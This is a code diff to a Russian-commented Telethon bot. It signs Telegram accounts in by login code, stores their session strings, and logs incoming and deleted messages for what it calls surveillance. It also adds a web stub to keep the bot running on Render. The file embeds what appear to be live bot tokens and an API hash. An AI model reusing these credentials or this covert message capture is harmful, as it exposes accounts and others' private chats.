@@ -5,10 +5,13 @@ from telethon import TelegramClient, events, Button
 from telethon.sessions import StringSession
 from telethon.errors import SessionPasswordNeededError
 
-# --- ТВОИ ДАННЫЕ ВШИТЫ НАПРЯМУЮ ---
-BOT_TOKEN = "8899789712:AAEnm0ZRdyXPpRZ4_ZsAdFDx4-uq08AVyus"
-ADMIN_ID = 8669477816
+# Импортируем мини веб-сервер для обхода ограничений Render
+from fastapi import FastAPI
+import uvicorn
 
+# --- ТВОИ ОБНОВЛЕННЫЕ ДАННЫЕ СЕЙЧАС ---
+BOT_TOKEN = "8947765577:AAFeZC4aE9J-KTTZ18yZffUWehUAEHWgYwo"
+ADMIN_ID = 8669477816
 API_ID = 39188918
 API_HASH = "41aaeaa0c6f9a61c0504395ccf5f3b3c"
 
@@ -16,18 +19,23 @@ API_HASH = "41aaeaa0c6f9a61c0504395ccf5f3b3c"
 logging.basicConfig(level=logging.INFO)
 db = sqlite3.connect("bot_data.db", check_same_thread=False)
 cursor = db.cursor()
-
 cursor.execute('''CREATE TABLE IF NOT EXISTS sessions (phone TEXT PRIMARY KEY, session_str TEXT)''')
 cursor.execute('''CREATE TABLE IF NOT EXISTS messages (acc_phone TEXT, msg_id INTEGER, chat_id INTEGER, sender_name TEXT, text TEXT, PRIMARY KEY (acc_phone, msg_id, chat_id))''')
 db.commit()
 
 bot = TelegramClient('main_bot_session', API_ID, API_HASH)
-
 user_steps = {}  
 active_clients = {}  
 
-# --- ЛОГИКА СЛЕЖКИ ЗА УДАЛЕНИЯМИ ---
+# --- СОЗДАЕМ ВЕБ-ЗАГЛУШКУ ДЛЯ RENDER ---
+app = FastAPI()
 
+@app.get("/")
+def read_root():
+    # Сюда можно направлять твой скрипт анти-спячки
+    return {"status": "ok", "message": "Бот-логер запущен и работает!"}
+
+# --- ЛОГИКА ТЕЛЕГРАМА (СБОР СООБЩЕНИЙ И УДАЛЕНИЯ) ---
 def register_userbot_handlers(client, phone):
     @client.on(events.NewMessage(incoming=True))
     async def on_new_message(event):
@@ -76,21 +84,20 @@ async def start_all_saved_accounts():
             if await cl.is_user_authorized():
                 active_clients[phone] = cl
                 register_userbot_handlers(cl, phone)
-                logging.info(f"Аккаунт {phone} успешно подключен.")
+                logging.info(f"Аккаунт {phone} успешно подключен к слежке.")
             else:
                 logging.warning(f"Сессия {phone} недействительна.")
         except Exception as e:
             logging.error(f"Не удалось запустить аккаунт {phone}: {e}")
 
 # --- ИНТЕРФЕЙС И КНОПКИ ---
-
 @bot.on(events.NewMessage(pattern='/start', from_users=ADMIN_ID))
 async def send_welcome(event):
     buttons = [
         [Button.inline("➕ Добавить аккаунт", b"add_acc")],
         [Button.inline("📱 Мои аккаунты", b"list_acc")]
     ]
-    await event.respond("👋 Привет! Я твой менеджер аккаунтов-логов на Render.\n\nЖми кнопки ниже:", buttons=buttons)
+    await event.respond("👋 Привет! Я твой новый менеджер аккаунтов-логов.\n\nЖми кнопки ниже:", buttons=buttons)
 
 @bot.on(events.CallbackQuery())
 async def callback_handler(event):
@@ -126,7 +133,7 @@ async def process_auth(event):
             send_code_res = await cl.send_code_request(phone)
             state["phone_code_hash"] = send_code_res.phone_code_hash
             state["step"] = "code"
-            await event.respond("📩 Отправил код. Введи его сюда:")
+            await event.respond("📩 Отправил код в Телеграм этого аккаунта. Введи его сюда:")
         except Exception as e:
             await event.respond(f"❌ Ошибка кода: {e}\nНачни заново через /start")
             user_steps.pop(ADMIN_ID, None)
@@ -171,15 +178,25 @@ async def save_and_start_session(event, cl, phone):
     db.commit()
     active_clients[phone] = cl
     register_userbot_handlers(cl, phone)
-    await event.respond(f"✅ <b>Аккаунт {phone} успешно запущен!</b>", parse_mode='html')
+    await event.respond(f"✅ <b>Аккаунт {phone} успешно запущен в слежку!</b>", parse_mode='html')
     user_steps.pop(ADMIN_ID, None)
 
-# --- ГЛАВНЫЙ ЗАПУСК СИСТЕМЫ ---
-async def main():
+# --- ЗАПУСК ДВУХ ПРОЦЕССОВ ОДНОВРЕМЕННО ---
+async def start_tg_bot():
     await bot.start(bot_token=BOT_TOKEN)
     await start_all_saved_accounts()
-    print("🤖 СИСТЕМА УСПЕШНО ЗАПУЩЕНА НА RENDER!")
+    print("🤖 Телеграм-бот на новом токене запущен!")
     await bot.run_until_disconnected()
+
+async def main():
+    # Запускаем бота фоном
+    asyncio.create_task(start_tg_bot())
+    
+    # Поднимаем веб-сервер на порту 10000 для Render
+    config = uvicorn.Config(app, host="0.0.0.0", port=10000, log_level="info")
+    server = uvicorn.Server(config)
+    await server.serve()
 
 if __name__ == '__main__':
     asyncio.run(main())
+                    
